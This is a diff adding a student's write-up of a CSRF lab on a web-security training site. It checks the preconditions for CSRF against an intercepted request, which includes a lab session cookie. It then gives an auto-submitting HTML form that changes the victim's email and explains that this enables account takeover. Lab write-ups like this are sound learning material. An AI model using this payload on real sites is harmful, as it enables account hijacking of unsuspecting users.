@@ -1,0 +1,80 @@
+##CSRF LAB 1
+Objective: Demostrate how CSRFV attack works
+
+Goal: Change victims email via CSRF attack
+
+##Conditions for CSRF
+1. Relevant action: An actionb that an attacker has a reason to want to induce.Usually state-changing actions e.g password changing
+2. Cookie-based session handling: The application should solely rely on cookies to track which use has issued a request and no any other mechanism
+3. no unpredictable request parameter: e.g password to change a password
+4. The user must authenticated or logged in to the application- credentials are given
+
+#Enumeration
+1. Logged in to the application
+2 using Burp intercepted the request to update the email:
+POST /my-account/change-email HTTP/2
+
+Host: 0a3200020380bcc0812c938e00020084.web-security-academy.net
+
+Cookie: session=MkQRGfxxsYF57LniREMGz9UKirXdjQX0
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 30
+
+Origin: https://0a3200020380bcc0812c938e00020084.web-security-academy.net
+
+Referer: https://0a3200020380bcc0812c938e00020084.web-security-academy.net/my-account?id=wiener
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: same-origin
+
+Sec-Fetch-User: ?1
+
+Priority: u=0, i
+
+Te: trailers
+
+
+
+email=change%40changing.ch.org
+
+A. relevant action[check]{POST /my-account/change-email} : The application has email update action which we are interested in.
+B. Cookie-based session handling[check]{Cookie: session=MkQRGfxxsYF57LniREMGz9UKirXdjQX0}: The application uses session cookies to track users
+C. no unpredictable request params[check]{email=change%40changing.ch.org}: The application requires only email parameter value to perfome the requested action
+d. User authentication[check]: credentials are given
+
+Therefore the application is mostly to be CSRF attack vulnerable
+
+#exploiting
+
+1. crafting the Payload: 
+<html>
+  <body>
+    <form method="POST" action="https://lab-id.web-security-academy.net/my-account/change-email">
+      <input type="hidden" name="email" value="change@changing.ch.org">
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+2. deliver the attack to the victim and the email got changed to "change@changing.ch.org"
+
+#what could be the impact?
+now having the email changed to on the attacker controls the attacker can trigger password reset and take over full account control
